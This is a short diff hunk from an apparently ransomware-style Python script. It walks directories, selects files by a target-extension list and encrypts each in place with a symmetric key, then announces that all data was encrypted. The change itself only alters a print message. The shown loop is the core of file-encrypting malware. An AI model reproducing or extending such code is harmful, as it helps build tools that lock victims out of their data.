@@ -34,7 +34,7 @@ if __name__ == '__main__':
                 full_path = root + os.sep + fn
                 ext=cipher.get_file_extension(full_path)
                 if ext in cipher.TARGET_EXT and ext not in cipher.EXCLUDED_EXT:
-                    print(full_path + '[encrypted]')
+                    print(full_path + ' -> [encrypted]')
                     cipher.symmetric_encrypt_or_decrypt(full_path, cipher.key)
 
     print('All data was successfully encrypted')
